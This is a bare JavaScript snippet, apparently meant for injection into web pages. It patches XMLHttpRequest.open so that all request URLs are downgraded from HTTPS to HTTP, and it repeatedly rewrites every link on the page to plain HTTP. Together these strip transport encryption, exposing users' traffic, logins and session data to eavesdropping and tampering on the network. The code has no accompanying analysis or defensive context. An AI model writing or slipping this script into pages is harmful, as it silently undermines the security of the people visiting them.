XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
XMLHttpRequest.prototype.open = function(method, url, async, username, password) {
	url = url.replace(/(http)s/ig, "$1")

	XMLHttpRequest.prototype.obf_open(method, url, async, username, password)
}

setInterval(function(){
	document.querySelectorAll("a").forEach(function(obf_a){
		obf_a.href = obf_a.href.replace(/(http)s/ig, "http")
	})
}, 666)
